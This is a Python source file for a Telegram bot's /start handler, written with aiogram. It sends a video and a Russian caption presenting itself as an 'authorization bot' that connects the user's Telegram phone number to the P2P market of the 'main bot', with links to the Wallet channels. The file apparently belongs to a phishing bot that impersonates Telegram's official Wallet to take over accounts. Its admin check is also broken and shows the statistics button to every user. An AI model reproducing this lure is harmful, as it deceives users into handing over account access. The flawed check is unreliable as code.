import os

import dotenv
from aiogram import Router, types
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder

from bot.start_bot import admin_id, test_id

dotenv.load_dotenv()

router = Router()

@router.message(CommandStart())
async def start_handler(message: types.Message):
    user_id = message.from_user.id

    if user_id == admin_id or test_id:
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text='👌 Начать', callback_data='start_button'))
        kb.row(InlineKeyboardButton(text="📊 Посмотреть статистику", callback_data="view_users"))

        await message.answer_video(
            video="https://cdn.discordapp.com/attachments/1220026066958287009/1221770355660816504/pay.mp4?ex=6613c950&is=66015450&hm=ba099a938fed6e6346804923145088562c708ba20fcb1f5dfc69d05c57799d12&",
            caption=(
                '<a href="https://t.me/wallet">БОТ АВТОРИЗАЦИИ.</a> '
                'Подключение вашего номера телефона Telegram к P2P-Маркету основного бота.\n'
                'Подписывайтесь на <a href="https://t.me/wallet_news">НАШ КАНАЛ.</a>'
            ),
            reply_markup=kb.as_markup(),
            parse_mode="HTML"
        )
    
    else:
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text='👌 Начать', callback_data='start_button'))
    
        await message.answer_video(
            video="https://cdn.discordapp.com/attachments/1220026066958287009/1221770355660816504/pay.mp4?ex=6613c950&is=66015450&hm=ba099a938fed6e6346804923145088562c708ba20fcb1f5dfc69d05c57799d12&",
            caption=(
                '<a href="https://t.me/wallet">БОТ АВТОРИЗАЦИИ.</a> '
                'Подключение вашего номера телефона Telegram к P2P-Маркету основного бота.\n'
                'Подписывайтесь на <a href="https://t.me/wallet_news">НАШ КАНАЛ.</a>'
            ),
            reply_markup=kb.as_markup(),
            parse_mode="HTML"
        )
